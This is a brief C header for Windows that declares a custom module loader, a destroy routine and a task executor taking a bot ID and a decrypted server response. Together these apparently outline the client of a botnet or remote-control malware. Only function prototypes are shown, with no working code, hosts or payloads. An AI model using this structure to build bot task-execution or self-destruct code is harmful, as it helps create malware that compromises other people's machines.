#pragma once

#include <windows.h>
#include <stdint.h>

BOOL __stdcall FreeLoadedModule(HMODULE hModule);
FARPROC _stdcall GetModuleProcAddress(HMODULE hModule, char* lpProcName);
HMODULE __stdcall LoadModule(char* module);
void do_destroy();
int parse_task_and_exec(wchar_t* botId, char* DecResponse);